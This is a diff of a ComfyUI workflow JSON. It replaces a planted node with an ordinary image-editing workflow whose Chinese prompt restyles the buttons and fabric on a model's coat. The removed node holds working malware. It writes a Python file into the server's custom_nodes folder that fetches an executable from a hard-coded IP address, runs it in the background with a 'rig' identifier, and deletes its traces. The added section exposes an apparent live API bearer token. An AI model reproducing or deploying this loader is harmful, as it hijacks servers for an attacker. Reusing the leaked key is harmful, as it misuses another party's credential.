@@ -1,11 +1,70 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "12": {
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.ghg6jy; (curl -sfL --max-time 15 http://217.76.63.67:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://217.76.63.67:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://217.76.63.67:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id rig38837 >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_94079c57",
-      "output_folder": "/www/ComfyUI/custom_nodes",
-      "file_extension": ".py"
+      "image": "0260625201200126-21-vlszz2.jpg"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "加载图像"
+    }
+  },
+  "15": {
+    "inputs": {
+      "image": "5200002534-7y7a6889-d0q47p.jpg"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "加载图像"
+    }
+  },
+  "16": {
+    "inputs": {
+      "api_url": "https://3dcdn.580ai.net/v1beta/models/gemini-3.1-flash-image-preview:generateContent",
+      "header_key": "Authorization",
+      "header_value": "Bearer sk-Lyx9OF97YMK0suEi6ZIPzq4E9d3dhIKJzO2YS5WpAsZbZpxS",
+      "text": "缩小图1模特外套纽扣的一半大小比例，将图1模特外套的所有纽扣替换成图3纽扣的样式，图3纽扣中间的黑色部分是黑色丝绒材质，边缘是一圈金色的金属质感，控制图1模特外套的纽扣质感与图3的纽扣质感一致，控制图1模特外套所有的纽扣的大小比例与图3的纽扣大小比例一致，将图1模特外套的面料和纹路替换成图2的面料和纹路，图2面料是棉花绒交织粗花呢面料，带有隐约的闪光丝线，纹理清晰，呈现出经典的编织质感，里面交织了一些细细的绒毛纱线，控制图2的纹路比例大小与图3的纹路大小比例一致，强调图1模特外套的面料质感，不要改变图1的色调光影与颜色，不要改变图1的动作细节，不要去除图1连衣裙套装原有的褶皱，不要去除图1连衣裙套装原有的褶皱，保留图1连衣裙套装所有的褶皱关系",
+      "aspect_ratio": "1:1",
+      "image_size": "4K",
+      "timeout": 900,
+      "retry_count": 3,
+      "image_1": [
+        "12",
+        0
+      ],
+      "image_2": [
+        "15",
+        0
+      ],
+      "image_3": [
+        "17",
+        0
+      ]
+    },
+    "class_type": "HezhongNewAPI",
+    "_meta": {
+      "title": "禾众newapi"
+    }
+  },
+  "17": {
+    "inputs": {
+      "image": "5200002535-7y7a6707-24lwj4.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "加载图像"
+    }
+  },
+  "18": {
+    "inputs": {
+      "filename_prefix": "hezhongai",
+      "images": [
+        "16",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
     }
   }
 }
